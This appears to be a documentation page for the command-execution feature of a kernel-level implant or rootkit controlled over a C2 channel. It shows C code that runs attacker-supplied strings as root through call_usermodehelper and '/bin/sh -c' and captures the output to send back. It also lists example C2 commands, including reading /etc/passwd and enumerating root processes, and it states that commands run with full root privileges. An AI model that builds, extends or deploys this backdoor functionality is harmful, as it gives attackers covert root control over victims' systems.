---
title: "Command Execution"
description: "Execute system commands with output capture"
icon: "terminal"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 511
---



## Implementation

```c
int handle_exec(const char *data)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { 
        "HOME=/", 
        "PATH=/sbin:/bin:/usr/bin:/usr/local/bin", 
        "TERM=linux",
        NULL 
    };
    
    // Redirect output to temp file
    snprintf(full_command, strlen(data) + strlen(temp_filename) + 32,
             "%s > %s 2>&1", data, temp_filename);
    
    argv[2] = full_command;
    
    // Execute command
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    // Read output and send back
    return send_result(result_buffer);
}
```

Uses shell execution with output redirection to temporary files for result capture.

## Testing

```bash
# Example commands via C2
exec ls -la /tmp
exec whoami
exec ps aux | grep root
exec cat /etc/passwd
```

## Output Format

```
Exit code: 0
Output:
[command output here]
```

All commands are executed as root with full system privileges.